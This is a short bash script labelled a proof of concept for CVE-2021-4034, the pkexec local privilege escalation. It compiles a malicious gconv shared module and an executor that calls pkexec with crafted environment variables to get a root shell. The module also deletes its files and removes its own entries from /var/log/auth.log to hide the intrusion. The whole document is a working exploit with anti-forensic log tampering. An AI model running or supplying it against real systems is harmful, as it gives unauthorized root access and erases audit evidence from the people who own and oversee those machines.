#!/bin/bash
echo "██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ "
echo "██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗"
echo "██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝"
echo "██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗"
echo "██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║"
echo "╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝"
echo "CVE-2021-4034 PoC by Kim Schulz"
# shell poc by Kim Schulz
echo "[+] Setting up environment..."
mkdir -p 'GCONV_PATH=.'
touch 'GCONV_PATH=./pkwner'
chmod a+x 'GCONV_PATH=./pkwner'
mkdir -p pkwner
echo "module UTF-8// PKWNER// pkwner 2" > pkwner/gconv-modules
cat > pkwner/pkwner.c <<- EOM
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
  printf("hello");
  setuid(0); setgid(0);
	seteuid(0); setegid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
         "rm -rf 'GCONV_PATH=.' 'pkwner';"
         "cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
         "/bin/bash");
	exit(0);
}
EOM

cat > pkwner/exec.c <<- EOM
#include <stdlib.h>
#include <unistd.h>
int main(){
  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
                 "SHELL=pkwner", NULL};
  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}
EOM
echo "[+] Build offensive gconv shared module..."
gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c
echo "[+] Build mini executor..."
gcc -o pkwner/executor pkwner/exec.c
# export PATH="GCONV_PATH=."
# export CHARSET="PKWNER"
#export SHELL=pkwner
PATH='GCONV_PATH=.' ./pkwner/executor
echo "[+] Nice Job"
